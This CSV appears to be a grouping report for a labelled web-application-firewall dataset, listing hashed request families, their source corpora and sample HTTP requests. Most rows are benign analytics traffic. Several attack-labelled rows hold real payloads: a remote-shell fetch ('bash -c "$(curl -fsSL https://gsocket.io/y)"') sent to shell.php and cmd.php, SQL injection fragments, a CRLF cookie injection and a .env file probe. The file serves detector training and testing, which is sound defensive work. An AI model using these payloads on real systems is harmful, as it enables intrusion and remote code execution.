"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"payload_family_hash","711b7eebeafaac4e5496e0ce","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002144|norm_modsec_learn_002145|norm_modsec_learn_002146","GET","/","si=undefined&action=5d5d1017-f9c4-437c-bea6-ea813f81dee4&waccluster=PNL1&Iid=sid257%2Fcid3763321786%2Fth"
"payload_family_hash","72d70283530dd28691133ae6","3","0","openappsec_legitimate","normal","norm_legitimate_001698|norm_legitimate_001697|norm_legitimate_001696","GET","/commerce/marketplace/page-data/sq/d/3508090095.json",""
"payload_family_hash","7982221d938fd3ebaa5138be","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000380|norm_modsec_learn_000379|norm_modsec_learn_000384","GET","/","random=1663662150574&cv=9&fst=1663660800000&num=1&bg=ffffff&hl=EN&guid=ON&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa9j0&sendb=1&data=event%3Dpage_view%3BloggedIn%3D(not%20set)%3BcustomerType%3DSMB%3BpageType-hit%3DSales%3BpageType-session%3D"
"payload_family_hash","7bc94abbff12d5cb69f27e41","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001856|norm_modsec_learn_001854|norm_modsec_learn_001855","GET","/","cors=true&content-type=application/x-json-stream&client-id=NO_AUTH&client-version=1DS-Web-JS-3.1.4&apikey=PRESENT&upload-time=1662637889502&time-delta-to-apply-millis=443&w=2"
"payload_family_hash","7f1dd5f1600b313dbead07ab","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002531|norm_modsec_learn_001381|norm_modsec_learn_000820","GET","/","id=UA-65409349-1"
"payload_family_hash","7f34f74e51eb3d5bd12567cf","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000697|norm_modsec_learn_000696|norm_modsec_learn_000698","GET","/","cnst=1&_=688441&uid=-6566248048887544950&sec=8765621&t=ri&e=1254188&p=3&ve=11088674&va=%5B27085500%5D&ses=41fcfea061ff777d9c5acd772acf3f2c&expSes=30773&aud=96287.96289&expVisitId=120720932081732992&mech=1&smech=null&eri=1&tsrc=Direct&reqts=1660208059626&rri=2315657"
"payload_family_hash","8865ba57a38de6f04b0578cd","3","1","csic_2010","csic_anomalous","pos_csic_001109|pos_csic_001626|pos_csic_000483","POST","/tienda1/publico/anadir.jsp",""
"payload_family_hash","889c773f421c694b601af371","3","0","openappsec_legitimate","normal","norm_legitimate_002291|norm_legitimate_002178|norm_legitimate_002159","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4730v886006994za200zb851582372&_p=1720601353709&gcd=13l3l3l3l1&npa=0&dma=0&tag_exp=0&cid=455635995.1720601296&ecid=1679094175&ul=en-us&sr=1920x1080&ur=US-VA&uaa=x86&uab=64&uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0.6478.127&ua"
"payload_family_hash","8ae6d0474216027d0c6892a6","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001461|norm_modsec_learn_001460|norm_modsec_learn_001531","GET","/","random=1525592736&cv=9&fst=1660561182589&num=1&label=P5xjCLy0zsgDEN-arM0D&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&eid=376635471&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=9&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa880&sendb=1&ig=1&data=event%3Dconversion&frm=0&url=https%3A%2F%2Fwww."
"payload_family_hash","8af7598ce5876b49a2ef847b","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001391|norm_modsec_learn_001390|norm_modsec_learn_001389","GET","/","imageOpt=1&fit=bounds&width=290"
"payload_family_hash","8fd2785ff8cde7ebd04bfe57","3","0","openappsec_legitimate","normal","norm_legitimate_000009|norm_legitimate_000040|norm_legitimate_000020","POST","/r/api/personalize/customerEvents/events/publish","brand=flowers&entryBrand=flowers"
"payload_family_hash","90381aa0a0a18a44107f87f4","3","1","csic_2010","csic_anomalous","pos_csic_001635|pos_csic_002393|pos_csic_000741","GET","/.jsp",""
"payload_family_hash","90705ca442ed8e50140c24c2","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001919|norm_modsec_learn_001918|norm_modsec_learn_000807","GET","/","id=256050818748517&ev=PageView&dl=https%3A%2F%2Fwww.shufersal.co.il%2Fonline%2Fhe%2F%25D7%25A7%25D7%2598%25D7%2592%25D7%2595%25D7%25A8%25D7%2599%25D7%2595%25D7%25AA%2F%25D7%25A4%25D7%2590%25D7%25A8%25D7%259D-%25D7%2595%25D7%25A7%25D7%2595%25D7%25A1%25D7%259E%25D7%2598%25D7%2599%25D7%25A7%25D7%2594-%"
"payload_family_hash","919c4de9013b8ed9f8e7b853","3","1","csic_2010","csic_anomalous","pos_csic_001856|pos_csic_002521|pos_csic_001046","POST","/tienda1/publico/anadir.jsp",""
"payload_family_hash","9307949f10ac570a3e70b466","3","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_002825|pos_owasp_modsec_002252|pos_owasp_modsec_002455","GET","/isotope.js",""
"payload_family_hash","94aace743425597fb400e543","3","0","openappsec_legitimate","normal","norm_legitimate_000858|norm_legitimate_000913|norm_legitimate_000960","GET","/trk/4/s/a-24f48522/p/adidas.us/934084416-0","mr=t1715147729&mi=%275.383122870.1719747512909%27&cs=!t&e=!(viewPage,gr,gt)&pt=GLP&r=%27%27&sw=1920&sh=1080&sc=24&j=!f&tg=!(!(34474,%2749632376869808639270227858961487525092%27))&u=%27https://www.adidas.com/us/kids%27&fl=!f&hvc=!t&eoq=!t"
"payload_family_hash","959630297c299d20c7b3000e","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000663|pos_owasp_modsec_001449|pos_owasp_modsec_001369","GET","/d_1dfbfc8b/d_ebec15cd/d_eda37985/d_9a52310f/d_a9b36e7e/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","99b70b970392ababe8dd8a9d","3","0","openappsec_legitimate","normal","norm_legitimate_001384|norm_legitimate_001381|norm_legitimate_001385","GET","/843aa27f089f/0d5135d958464109968a7fc311417676/prop.json","_=1719747652430"
"payload_family_hash","9bacb12e5c2803f673217a05","3","0","openappsec_legitimate","normal","norm_legitimate_000449|norm_legitimate_000500|norm_legitimate_000546","GET","/WRSiteInterceptEngine/","Q_ZID=ZN_6LQgOFCfs1YJxVs&Q_LOC=https%3A%2F%2Fwww.abercrombie.com%2Fshop%2Fwd%2Fp%2Fthe-a-and-f-madeline-wool-blend-crew-sweater-56441848%3Ffaceout%3Dmodel%26seq%3D03"
"payload_family_hash","9bb521c35f67f7420ef532ea","3","0","openappsec_legitimate","normal","norm_legitimate_001779|norm_legitimate_001781|norm_legitimate_001782","POST","/recs/v1/precs/preconfigured",""
"payload_family_hash","9be10c0ddd5322c9f8da75d5","3","0","openappsec_legitimate","normal","norm_legitimate_002572|norm_legitimate_002578|norm_legitimate_002550","POST","/tracking/airdog",""
"payload_family_hash","9c12049c0d6cde3cf2901664","3","0","openappsec_legitimate","normal","norm_legitimate_002514|norm_legitimate_002502|norm_legitimate_002508","POST","/api/nuxt/en/analytics/visitlog",""
"payload_family_hash","9e6ddc6f5ce5c23d3b63e2a0","3","0","openappsec_legitimate","normal","norm_legitimate_001800|norm_legitimate_001798|norm_legitimate_001799","POST","/recs/v1/precs/preconfigured",""
"payload_family_hash","a18214f12bbeefcb9ae50b52","3","0","openappsec_legitimate","normal","norm_legitimate_002243|norm_legitimate_002379|norm_legitimate_002261","GET","/","account_id=2041&partner_id=2130&uid=03b71d3b-d3d4-4c4e-b0a9-9878573d0a3c&custom=&tag_format=img&tag_action=sync&rmt=true&cb=1720601374506"
"payload_family_hash","a60ee7c40864fd5b8b89ffba","3","1","modsec_learn_sqli","modsec_learn_sqli:sqli_kaggle","pos_modsec_learn_sqli_001566|pos_modsec_learn_sqli_001563|pos_modsec_learn_sqli_001565","GET","/","p=1%22+where+9725++%3D++9725"
"payload_family_hash","a72fce75112d7e9171db7147","3","1","csic_2010","csic_anomalous","pos_csic_001872|pos_csic_000589|pos_csic_000105","GET","/tienda1/publico/anadir.jsp","id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=48&B1=A%F1adir+al+carrito"
"payload_family_hash","a8a7868beb0a2a5f361071c8","3","0","openappsec_legitimate","normal","norm_legitimate_002258|norm_legitimate_002377|norm_legitimate_002236","GET","/","account_id=2023&partner_id=2118&uid=8e4f6d72a20bd8e97608088d76499250&tag_format=img&tag_action=sync&cb=625456458"
"payload_family_hash","a98d35cc06f6a159516da0cc","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002755|norm_modsec_learn_002756|norm_modsec_learn_002977","GET","/","t=dc&aip=1&_r=3&v=1&_v=j96&tid=UA-55634609-30&cid=1923012861.1662447591&jid=1501174059&gjid=58736318&_gid=1903245574.1662447592&_u=SCEAAEALAAAAAG~&z=1710257533"
"payload_family_hash","aa4d89f386e2d822f80de5db","3","1","csic_2010","csic_anomalous","pos_csic_002518|pos_csic_002854|pos_csic_000315","GET","/tienda1/publico/anadir.jsp.java",""
"payload_family_hash","ad1b2fc9d39e981111abef9b","3","0","openappsec_legitimate","normal","norm_legitimate_001005|norm_legitimate_001097|norm_legitimate_001139","GET","/user/","event=PageVisit&ed=%7B%22currency%22%3A%22USD%22%2C%22page_title%22%3A%22adidas%20Grand%20Court%202.0%20Shoes%20Kids%20-%20White%20%7C%20Kids%27%20Lifestyle%20%7C%20adidas%20US%22%2C%22line_items%22%3A%5B%7B%22product_id%22%3A%22ID0741%22%2C%22product_name%22%3A%22GRAND%20COURT%202.0%20SHOES%20KIDS%"
"payload_family_hash","ae9cb59f66f793b02e086099","3","1","csic_2010","csic_anomalous","pos_csic_002813|pos_csic_000706|pos_csic_000855","POST","/tienda1/publico/anadir.jsp",""
"payload_family_hash","b19564dc33eea2d21a4fc246","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002412|pos_owasp_modsec_000612|pos_owasp_modsec_001900","GET","/cmd.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","b25b865de1fd65bde32a5e00","3","0","openappsec_legitimate","normal","norm_legitimate_002292|norm_legitimate_002422|norm_legitimate_002424","POST","/actionp/0","ti=4002941&Ver=2&mid=646ef04a-a6c9-4837-857f-fd99b71e9812&sid=428b9b903e9911efb457efdc28aa456f&vid=428bc2003e9911ef803bad7bacac9344&vids=0&msclkid=N&evt=pageHide"
"payload_family_hash","b35680beb2424dbd360838d6","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002674|norm_modsec_learn_002673|norm_modsec_learn_002084","GET","/","random=1660550868074&cv=9&fst=1660550868074&num=1&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&eid=376635471&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&ig=1&data=event%3Dview_item_list%3Bgoogle_business_vertical%3Dretail%3Bid%3D01288"
"payload_family_hash","b9b1a71dd4d7b3889f687257","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002270|norm_modsec_learn_002269|norm_modsec_learn_002268","GET","/","v=11.6.3&str=58&di=872&dc=1725&fl=1727&sr=55&mdh=24056&pn=15&uu=2f5e8414-b504-a026-864b-e4affc7192d0&sn=1&lv=1663515267&lhd=1663515267&hd=1663515547&pid=613&ct=1"
"payload_family_hash","bed3d54893e997e9d970d3ca","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000051|norm_modsec_learn_000053|norm_modsec_learn_000054","GET","/","a=148914409&sa=1&v=1216.487a282&t=Unnamed%20Transaction&rst=12872&ck=1&ref=https://www.atptour.com/en/scores/current-challenger/szczecin/448/draws"
"payload_family_hash","c1cdcb42b75e52afee788ca3","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000238|norm_modsec_learn_000236|norm_modsec_learn_000237","GET","/","includes=price,holidayPriceDealMessages&context=product-carousel-v2&destinationZipCode=55401&layout=mini&planPaidMember=false&skuId=6487420"
"payload_family_hash","c20098c3cd32020c9b6a992c","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002265|norm_modsec_learn_002267|norm_modsec_learn_002266","GET","/","v=11.6.3&pid=613&uu=2f5e8414-b504-a026-864b-e4affc7192d0&sn=1&pn=14&dv=N4IgxgzgsghgLmAFgSwHYHMDSBTAniALhAAYA6AFgDYBGAZmNoHZqAmRxl2gTgA4uB9apUq0ArNVEtK7HsRABfIA&r=973944"
"payload_family_hash","c4f1b848d12abd5521854c8c","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000034|norm_modsec_learn_000033|norm_modsec_learn_000035","GET","/","OrgId=WMNR1&UserId=4842632323731456&SessionId=6012698725650432&PageId=4941030901092352&Seq=2&PageStart=1660130855199&PrevBundleTime=1660130855976&LastActivity=40"
"payload_family_hash","c575e90bef8f1d6ef6889d43","3","0","openappsec_legitimate","normal","norm_legitimate_000083|norm_legitimate_000088|norm_legitimate_000089","POST","/gen_204","atyp=csi&ei=oR2zZvzmGZKl5NoPw9Ko0A4&s=async&astyp=asyncContextualTask&rt=ttfb.885,ft.890&zx=1723014564505&opi=89978449"
"payload_family_hash","ca93b91f0b00753a4d2eecb5","3","0","openappsec_legitimate","normal","norm_legitimate_002706|norm_legitimate_002463|norm_legitimate_001625","POST","/fc/gt2/public_key/9E720074-0602-42DD-B539-FAEA47262462",""
"payload_family_hash","caf0b48c5691bb170c6074f6","3","0","openappsec_legitimate","normal","norm_legitimate_001379|norm_legitimate_001307|norm_legitimate_000998","POST","/v1/osm-client-script/0.0.264/aggr_b","ab=osm-frontends&d=credit-promotion-auto-size&h=EN&i=US&iid=1533&iv=web-sdk&level=2&sdk=websdk&sid=b05434e7-c42a-44b9-ac72-ea17918dc887&timestamp=1719747651435"
"payload_family_hash","cc5a445da1e9c0248e4fa4c0","3","0","openappsec_legitimate","normal","norm_legitimate_002242|norm_legitimate_002259|norm_legitimate_002378","GET","/pushpull","pid=e873dca0-85f0-4b95-bfab-a8d855ece660&g=1&tr=1&return-unstable=true&uid=68e13410-36b3-11ef-84b7-abb9ec3581ec&cb=1720601374506&rmn=y&redirect=https%3A%2F%2Fpartner.mediawallahscript.com%2F%3Faccount_id%3D2041%26partner_id%3D2130%26uid%3D%24BROWSER_ID%26custom%3D%26tag_format%3Dimg%26tag_action%3Ds"
"payload_family_hash","cd87881e70c58826011d212b","3","0","openappsec_legitimate","normal","norm_legitimate_000256|norm_legitimate_000261|norm_legitimate_000247","POST","/rb_bf04553ytd","type=js3&sn=v_4_srv_8_sn_8D599C6152B1E85EB675338EEAE8B92B_perc_100000_ol_0_mul_1_app-3A8b2a7e44ceb3fcd4_1_app-3A165a5cc5c5fd7c11_1_rcs-3Acss_0&svrid=8&flavor=post&vi=CTQAIUEDFOKQVBNOJJKPQWVFHARARKRU-0&contentType=srBm&modifiedSince=1728321678686&rf=https%3A%2F%2Fwww.aa.com%2Fi18n%2Fmoresearch.jsp%3F"
"payload_family_hash","cf8bb8eda04734175d1ae6e3","3","0","openappsec_legitimate","normal","norm_legitimate_000346|norm_legitimate_000369|norm_legitimate_000354","POST","/shop/rb_bf61930lop","type=js3&sn=v_4_srv_20_sn_C0B7CD9BE67E5CB86AC651D7B933C649_perc_100000_ol_0_mul_1_app-3A59fcf8f3ef580f1f_1&svrid=20&flavor=post&vi=HNHKPCIDRBERMKMHCLDFFAFSHLTJCQLM-0&modifiedSince=1727802883945&rf=https%3A%2F%2Fwww.abercrombie.com%2Fshop%2Fwd&bp=3&app=59fcf8f3ef580f1f&crc=3848322541&en=hko5s9u1&end="
"payload_family_hash","cfc45042fe8c093174c04183","3","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_002281|pos_owasp_modsec_000080|pos_owasp_modsec_001083","GET","/awstats/.env",""
"payload_family_hash","d25d611d86c0845c525e5280","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002891|norm_modsec_learn_002887|norm_modsec_learn_002890","GET","/","vc=1.1&vv=1.1&ctid=GTM-5T9932C&idx=8&event_name=gtm.js&variable_name=dlv%20-%20ecommerce.impressions&channels=&tag_names=&dlKey=ecommerce.impressions&dlValue=undefined&cond=required&condValue=true&url=https%3A%2F%2Fstoryonline.co.il%2Faccount%2Flogin%3Freturn_url%3D%252Faccount"
"payload_family_hash","d593c0403971d0e3cfacf271","3","0","openappsec_legitimate","normal","norm_legitimate_002278|norm_legitimate_002273|norm_legitimate_002282","POST","/v2_1","p=js&v=1.15.1&t=1720601387869&sid=2c3ceoj33aquoc042jqtwn4r"
"payload_family_hash","d5f7c7d51aef501c9de13315","3","0","openappsec_legitimate","normal","norm_legitimate_001159|norm_legitimate_001071|norm_legitimate_001061","POST","/.well-known/attribution-reporting/debug/report-event-attribution",""
"payload_family_hash","d6c3fb21b5bb51c57363ecde","3","0","openappsec_legitimate","normal","norm_legitimate_001118|norm_legitimate_001414|norm_legitimate_001340","GET","/action/0","ti=5713812&Ver=2&mid=f008fc41-a904-4dd1-99d0-7f276b3ab973&sid=51cd976036d511ef88680dd62cd4e68e&vid=51cde72036d511efb6de350517090e1b&vids=0&msclkid=N&gc=USD&pagetype=cart&p=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html&sw=1920&sh=1080&sc=24&evt=custom&rn=40889"
"payload_family_hash","dcbb73da672b0286aa7e805b","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002877|norm_modsec_learn_002893|norm_modsec_learn_002878","GET","/","vc=1.1&vv=1.1&ctid=GTM-5T9932C&idx=2&event_name=gtm.pageError&variable_name=dlv%20-%20ecommerce.impressions&channels=&tag_names=&dlKey=ecommerce.impressions&dlValue=undefined&cond=required&condValue=true&url=https%3A%2F%2Fstoryonline.co.il%2Faccount%2Flogin%3Freturn_url%3D%252Faccount"
"payload_family_hash","e0de54c37d8939c401575072","3","1","csic_2010","csic_crlf","pos_csic_002063|pos_csic_002568|pos_csic_002265","GET","/tienda1/publico/vaciar.jsp","B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727"
"payload_family_hash","e292f6ce1ed219656491460d","3","0","openappsec_legitimate","normal","norm_legitimate_000371|norm_legitimate_000378|norm_legitimate_000419","GET","/is/image/anf/KIC_150-4459-00095-178_sw","policy=product-xsmall"
"payload_family_hash","e2f5c6937d935b983163aa33","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002082|norm_modsec_learn_001476|norm_modsec_learn_002083","GET","/","random=1660541151578&cv=9&fst=1660539600000&num=1&bg=ffffff&guid=ON&eid=376635471&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&frm=0&url=https%3A%2F%2Fwww.nike.com%2Fil%2Fw%2Fwomens-shoes-5e1x6zy7ok&ref=https%3A%2F%2Fwww.nike.com%"
"payload_family_hash","e33ac97e0b2ae064454bf2df","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001722|norm_modsec_learn_001113|norm_modsec_learn_002313","GET","/","ver=3.3"
"payload_family_hash","e4359d8103547cc7c381289a","3","0","openappsec_legitimate","normal","norm_legitimate_002077|norm_legitimate_002164|norm_legitimate_002166","POST","/g/collect","v=2&tid=G-C07L4VP9DZ&gtm=45je4730v9137961602za200&_p=1720601329544&gcd=13l3l3l3l2&npa=0&dma=0&tag_exp=0&ul=en-us&sr=1920x1080&cid=455635995.1720601296&ir=1&uaa=x86&uab=64&uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0.6478.127&uamb=0&uam=&uap=Windows&uapv=12."
"payload_family_hash","e73fe4f27b959ad4decbb64d","3","0","openappsec_legitimate","normal","norm_legitimate_001562|norm_legitimate_001543|norm_legitimate_001538","POST","/",""
"payload_family_hash","eb9d243b1257d95584637f97","3","0","openappsec_legitimate","normal","norm_legitimate_002513|norm_legitimate_002507|norm_legitimate_002503","POST","/api/nuxt/en/analytics/visitlog",""
"payload_family_hash","ef4f7b6b63065d66a19d2b0c","3","0","openappsec_legitimate","normal","norm_legitimate_001769|norm_legitimate_001690|norm_legitimate_001770","POST","/collector/tp2",""
"payload_family_hash","f1873e5a6818cf317732781d","3","0","openappsec_legitimate","normal","norm_legitimate_002372|norm_legitimate_002208|norm_legitimate_002257","GET","/","account_id=1043&partner_id=1048&uid=k-UtZ3TgxC5PD_-lLWli5PrBysYYAulVPiXEY0FQ&custom=&tag_format=img&tag_action=sync&custom=&cb=5c706050-a313-4c47-a97f-9aae31077e6b"
"payload_family_hash","f932a3bf9a74a4bd4563d3ee","3","1","owasp_modsecurity","owasp_php_injection:933140","pos_owasp_modsec_002947|pos_owasp_modsec_001810|pos_owasp_modsec_001987","POST","/d_795dc9a1/d_9d047632",""
"payload_family_hash","fba069792a8a1e1ad6ab1f7e","3","0","openappsec_legitimate","normal","norm_legitimate_002051|norm_legitimate_002072|norm_legitimate_002047","POST","/g/collect","v=2&tid=G-T408Z268D2&gtm=45je4730v886006994z8851582372za200zb851582372&_p=1720601329544&gcd=13l3l3l3l1&npa=0&dma=0&tag_exp=0&cid=455635995.1720601296&ecid=1679094175&ul=en-us&sr=1920x1080&lps=1&ur=US-VA&uaa=x86&uab=64&uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B"
"payload_family_hash","fbbb1de991392018d5f68c01","3","0","openappsec_legitimate","normal","norm_legitimate_000917|norm_legitimate_000965|norm_legitimate_000805","GET","/action/0","ti=5713812&Ver=2&mid=adfba700-5b5a-41f1-9f22-5a9e3ba34be5&sid=51cd976036d511ef88680dd62cd4e68e&vid=51cde72036d511efb6de350517090e1b&vids=0&msclkid=N&uach=pv%3D12.0.0&pi=918639831&lg=en-US&sw=1920&sh=1080&sc=24&tl=%F0%9F%91%95Kids%27%20Shoes%20and%20Clothing%20%7C%20adidas%20US%F0%9F%91%95&p=https%3A"
"payload_family_hash","fc6ca5d7395bb47f899f9e55","3","1","modsec_learn_sqli","modsec_learn_sqli:sqli_kaggle","pos_modsec_learn_sqli_001979|pos_modsec_learn_sqli_001987|pos_modsec_learn_sqli_001988","GET","/","p=1++%29+++where+2170++%3D++2170"
